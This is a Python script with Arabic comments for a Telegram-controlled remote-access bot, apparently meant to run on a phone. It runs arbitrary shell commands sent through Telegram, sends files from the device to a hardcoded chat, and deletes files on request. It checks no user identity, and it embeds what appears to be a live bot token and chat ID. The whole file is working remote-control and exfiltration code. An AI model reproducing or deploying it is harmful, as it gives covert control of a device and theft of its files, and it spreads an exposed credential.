import subprocess
import os
import telebot
from telebot import types

# إعدادات البوت
token = '6378129166:AAGJgpDvfHjsd758sDJ42mzfA9LlSi7KsYo'
chat_id = '956893993'
bot = telebot.TeleBot(token)

# وظيفة لتنفيذ أوامر التيرمينال وإرجاع النتيجة
def execute_terminal_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    output = result.stdout.strip() if result.stdout else result.stderr.strip()
    return output

# وظيفة لتحميل الملفات من الهاتف إلى البوت
def download_file(file_path):
    try:
        with open(file_path, 'rb') as file:
            bot.send_document(chat_id, file)
    except FileNotFoundError:
        bot.send_message(chat_id, "الملف غير موجود.")

# في وظيفة التعامل مع الرسائل الواردة
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    command = message.text.strip()

    # تنفيذ أمر "terminal" لتنفيذ أوامر الترمينال
    if command == "/terminal":
        reply_markup = types.ForceReply(selective=False)
        bot.send_message(message.chat.id, "أدخل الأمر الذي تريد تنفيذه:", reply_markup=reply_markup)

    # تنفيذ أمر "download" لتحميل الملف
    elif command == "/download":
        reply_markup = types.ForceReply(selective=False)
        bot.send_message(message.chat.id, "أدخل مسار الملف الذي تريد تحميله:", reply_markup=reply_markup)

    # تنفيذ أمر "cd" لتغيير الدليل الحالي
    elif command == "/cd":
        reply_markup = types.ForceReply(selective=False)
        bot.send_message(message.chat.id, "أدخل المسار الذي تريد التنقل إليه:", reply_markup=reply_markup)

    # تنفيذ أمر "ls" لعرض محتويات المجلد الحالي
    elif command == "/ls":
        output = execute_terminal_command("ls")
        bot.send_message(message.chat.id, output)

    # تنفيذ أمر "pwd" لعرض المسار الحالي
    elif command == "/pwd":
        output = execute_terminal_command("pwd")
        bot.send_message(message.chat.id, output)

    # تنفيذ أمر "date" لعرض التاريخ الحالي
    elif command == "/date":
        output = execute_terminal_command("date")
        bot.send_message(message.chat.id, output)

    # تنفيذ أمر "echo" لطباعة رسالة
    elif command.startswith("/echo "):
        message_text = command.replace("/echo ", "")
        bot.send_message(message.chat.id, message_text)

    # تنفيذ أمر "mkdir" لإنشاء مجلد جديد
    elif command.startswith("/mkdir "):
        directory_name = command.replace("/mkdir ", "")
        try:
            os.mkdir(directory_name)
            bot.send_message(message.chat.id, f"تم إنشاء المجلد '{directory_name}' بنجاح.")
        except FileExistsError:
            bot.send_message(message.chat.id, f"المجلد '{directory_name}' موجود بالفعل.")

    # تنفيذ أمر "rm" لحذف ملف أو مجلد
    elif command.startswith("/rm "):
        path = command.replace("/rm ", "")
        if os.path.exists(path):
            try:
                if os.path.isfile(path):
                    os.remove(path)
                    bot.send_message(message.chat.id, f"تم حذف الملف '{path}' بنجاح.")
                else:
                    os.rmdir(path)
                    bot.send_message(message.chat.id, f"تم حذف المجلد '{path}' بنجاح.")
            except OSError as e:
                bot.send_message(message.chat.id, f"حدث خطأ أثناء حذف '{path}': {e}")
        else:
            bot.send_message(message.chat.id, f"المسار '{path}' غير موجود.")

    # التحكم بتنفيذ أمر "terminal"
    elif message.reply_to_message and message.reply_to_message.text == "أدخل الأمر الذي تريد تنفيذه:":
        terminal_command = message.text.strip()
        output = execute_terminal_command(terminal_command)
        bot.send_message(message.chat.id, output)

    # التحكم بتنفيذ أمر "download"
    elif message.reply_to_message and message.reply_to_message.text == "أدخل مسار الملف الذي تريد تحميله:":
        file_path = message.text.strip()
        download_file(file_path)

    # التحكم بتنفيذ أمر "cd"
    elif message.reply_to_message and message.reply_to_message.text == "أدخل المسار الذي تريد التنقل إليه:":
        directory = message.text.strip()
        if not directory:
            bot.send_message(message.chat.id, "مسار فارغ.")
        else:
            try:
                os.chdir(directory)
                bot.send_message(message.chat.id, f"تم تغيير الدليل الحالي إلى '{directory}'.")
            except FileNotFoundError:
                bot.send_message(message.chat.id, f"المسار '{directory}' غير موجود.")

    # قائمة الأوامر
    elif command == "/commands":
        commands = [
            "/terminal [الأمر]: تنفيذ أمر في الترمينال",
            "/download [مسار الملف]: تحميل ملف",
            "/cd [اسم الدليل]: تغيير الدليل الحالي",
            "/ls: عرض محتويات المجلد الحالي",
            "/echo: عرض قائمة الأوامر",
            "/rm [مسار الملف]: حذف ملف",
            "/date: التاريخ",
            "/pwd: المسار الحالي",
            "/commands: عرض قائمة الأوامر"
        ]
        commands_text = "\n".join(commands)
        bot.send_message(message.chat.id, f"قائمة الأوامر:\n\n{commands_text}")

    else:
        bot.send_message(message.chat.id, "الأمر غير معروف.")

bot.polling(timeout=120)
